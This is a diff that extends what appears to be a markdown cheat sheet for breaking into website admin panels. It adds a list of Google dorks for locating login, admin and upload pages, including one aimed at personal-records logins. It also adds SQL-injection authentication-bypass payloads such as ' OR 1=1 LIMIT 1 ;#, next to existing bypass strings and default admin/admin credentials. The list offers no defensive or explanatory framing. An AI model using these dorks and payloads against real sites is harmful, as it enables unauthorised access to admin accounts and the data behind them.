@@ -57,3 +57,27 @@ Two
 - admin') or '1'='1'/*
 
 - user Name: admin password: admin
+
+## DORKS:
+- inurl:adminlogin.aspx
+- inurl:admin/index.php
+- inurl:administrator.php
+- inurl:administrator.asp
+- inurl:login.asp
+- inurl:login.aspx
+- inurl:login.php
+- inurl:admin/index.php
+- inurl:adminlogin.aspx
+- inurl:personalrecords/login.php
+- inurl:admin/Uploade
+- inurl:admin/Upload
+- inurl:creative-admin
+- inurl:-admin/login.php
+- inurl:*-admin/index.php
+- inurl:-admin/admin.php
+## PAYLOADS
+- 1'or'1'='1
+- ' OR 1=1 LIMIT 1 ;#
+- ' or 1=1 limit 1 -- -+
+- admin' or '1'='1
+- 'or 1=1 limit 1-- -+---
